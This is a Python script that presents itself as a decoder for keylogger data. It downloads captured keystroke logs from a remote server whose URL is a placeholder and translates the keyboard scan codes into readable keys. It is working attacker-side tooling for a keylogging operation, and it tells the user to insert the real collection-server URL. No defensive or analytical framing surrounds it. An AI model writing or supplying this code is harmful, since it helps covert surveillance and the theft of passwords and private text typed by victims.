# Decoder for Keylogger Data
# Replace `SERVER_URL` with the actual URL where the key data is hosted.

import urllib.request

# Mapping of scan codes to keys
SCAN_CODE_TO_KEY = {
    "1": "ESC", "2": "1", "3": "2", "4": "3", "5": "4", "6": "5", "7": "6", "8": "7",
    "9": "8", "10": "9", "11": "0", "12": "-", "13": "=", "14": "[BACK]", "15": "[TAB]",
    "16": "q", "17": "w", "18": "e", "19": "r", "20": "t", "21": "y", "22": "u",
    "23": "i", "24": "o", "25": "p", "26": "[", "27": "]", "28": "[ENTER]", "29": "[CTRL]",
    "30": "a", "31": "s", "32": "d", "33": "f", "34": "g", "35": "h", "36": "j",
    "37": "k", "38": "l", "39": ";", "40": "'", "41": "`", "42": "[LSHIFT]",
    "43": "\\", "44": "z", "45": "x", "46": "c", "47": "v", "48": "b", "49": "n",
    "50": "m", "51": ",", "52": ".", "53": "/", "54": "[RSHIFT]", "55": "[PRTSC]",
    "56": "[ALT]", "57": "[SPACE]", "58": "[CAPS]", "59": "[F1]", "60": "[F2]",
    "61": "[F3]", "62": "[F4]", "63": "[F5]", "64": "[F6]", "65": "[F7]", "66": "[F8]",
    "67": "[F9]", "68": "[F10]", "69": "[NUM]", "70": "[SCROLL]", "71": "[HOME(7)]",
    "72": "[UP(8)]", "73": "[PGUP(9)]", "74": "-", "75": "[LEFT(4)]", "76": "[CENTER(5)]",
    "77": "[RIGHT(6)]", "78": "+", "79": "[END(1)]", "80": "[DOWN(2)]", "81": "[PGDN(3)]",
    "82": "[INS]", "83": "[DEL]"
}

def fetch_key_data(url):
    """
    Fetch key data from the server.
    :param url: URL to fetch key data from.
    :return: Raw server response as a string.
    """
    try:
        with urllib.request.urlopen(url) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        print(f"Error fetching data: {e}")
        return ""

def decode_keys(data):
    """
    Decode the key data using the scan code mapping.
    :param data: Raw key data from the server.
    """
    lines = data.splitlines()
    for line in lines:
        line = line.replace("b", "").replace("'", "")
        decoded_keys = []
        for scan_code in line.split("."):
            if scan_code in SCAN_CODE_TO_KEY:
                decoded_keys.append(SCAN_CODE_TO_KEY[scan_code])
        print(" ".join(decoded_keys))

if __name__ == "__main__":
    # Placeholder URL. Replace with the actual server URL.
    SERVER_URL = "https://example.com/key.txt"  # Replace this with the actual URL or use a local file for testing.

    # Fetch and decode the key logs
    raw_data = fetch_key_data(SERVER_URL)
    if raw_data:
        decode_keys(raw_data)
